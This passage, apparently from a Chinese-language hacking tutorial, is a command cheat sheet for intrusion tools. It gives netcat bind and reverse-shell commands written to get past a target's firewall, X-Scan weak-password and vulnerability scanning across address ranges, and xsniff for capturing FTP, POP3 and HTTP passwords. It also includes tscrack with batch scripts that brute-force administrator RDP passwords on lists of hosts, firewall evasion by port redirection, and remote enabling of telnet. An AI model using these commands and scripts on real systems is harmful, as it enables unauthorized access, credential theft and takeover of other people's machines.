nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口
nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口
高级用法：
nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止
nc -L -p 80 > c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt
nc -L -p 80 < c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用
type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用
本机上用：nc -l -p 本机端口
在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K
nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙
本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称
在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机
备 注：
　　| 管道命令
　　< 或 > 重定向命令。“<”，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令
　　@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt >> d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中
　　>与>>的区别 ">"指：覆盖；">>"指：保存到(添加到）。
如：@dir c:winnt >> d:log.txt和@dir c:winnt > d:log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。
八：
扫描工具：xscan.exe
基本格式
xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息
xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息
检测项目
　　-active 检测主机是否存活
　　-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）
　　-port 检测常用服务的端口状态
　　-ftp 检测FTP弱口令
　　-pub 检测FTP服务匿名用户写权限
　　-pop3 检测POP3-Server弱口令
　　-smtp 检测SMTP-Server漏洞
　　-sql 检测SQL-Server弱口令
　　-smb 检测NT-Server弱口令
　　-iis 检测IIS编码/解码漏洞
　　-cgi 检测CGI漏洞
　　-nasl 加载Nessus攻击脚本
　　-all 检测以上所有项目
其它选项
　　-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取
　　-l 显示所有网络适配器
　　-v 显示详细扫描进度
　　-p 跳过没有响应的主机
　　-o 跳过没有检测到开放端口的主机
　　-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10
　　-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)
用法示例
xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机
xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机
xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机
九：
命令行方式嗅探器: xsniff.exe
可捕获局域网内FTP/SMTP/POP3/HTTP协议密码
参数说明
　　-tcp 输出TCP数据报
　　-udp 输出UDP数据报
　　-icmp 输出ICMP数据报
　　-pass 过滤密码信息
　　-hide 后台运行
　　-host 解析主机名
　　-addr IP地址 过滤IP地址
　　-port 端口 过滤端口
　　-log 文件名 将输出保存到文件
　　-asc 以ASCII形式输出
　　-hex 以16进制形式输出
用法示例
xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中
xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出
终端服务密码破解: tscrack.exe
参数说明
　　-h 显示使用帮助
　　-v 显示版本信息
　　-s 在屏幕上打出解密能力
　　-b 密码错误时发出的声音
　　-t 同是发出多个连接（多线程）
　　-N Prevent System Log entries on targeted server
　　-U 卸载移除tscrack组件
　　-f 使用－f后面的密码
　　-F 间隔时间（频率）
　　-l 使用－l后面的用户名
　　-w 使用－w后面的密码字典
　　-p 使用－p后面的密码
　　-D 登录主页面
用法示例
tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码
tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户
　　@if not exist ipcscan.txt goto noscan
　　@for /f "tokens=1 delims= " %%i in (3389.txt) do call hack.bat %%i
nscan
　　@echo 3389.txt no find or scan faild
　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)
3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat
　　@if not exist tscrack.exe goto noscan
　　@tscrack %1 -l administrator -w pass.dic >>rouji.txt
　　:noscan
　　@echo tscrack.exe no find or scan faild
　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)
hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。
其它
Shutdown.exe
Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）
fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）
fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息
Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。
OpenTelnet.exe (远程开启telnet工具)
opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。
NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。
ResumeTelnet.exe (OpenTelnet附带的另一个工具)
resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。